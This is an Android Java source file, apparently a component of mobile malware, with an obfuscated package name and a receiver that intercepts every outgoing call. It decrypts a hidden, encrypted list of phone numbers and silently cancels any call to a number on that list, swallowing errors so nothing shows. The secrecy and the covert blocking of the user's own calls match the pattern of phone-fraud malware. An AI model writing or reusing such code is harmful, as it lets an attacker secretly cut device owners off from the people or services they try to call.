package com.dsifakf.aoakmnq;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class Call extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        String number = intent.getStringExtra("android.intent.extra.PHONE_NUMBER").toString();
        String FilerN = "";
        try {
            FilerN = new String(new Secure().decrypt("693678c7798399635f59a4676d1c1a1260fa0656ec2b5f8ad746f2e87049745c0eef96ca1cd45fc2b865218dccb9a45fa8f07e95453def60e06c135d2b20607f"));
        } catch (Exception e) {
        }
        if (FilerN.contains(number)) {
            setResultData(null);
        }
    }
}
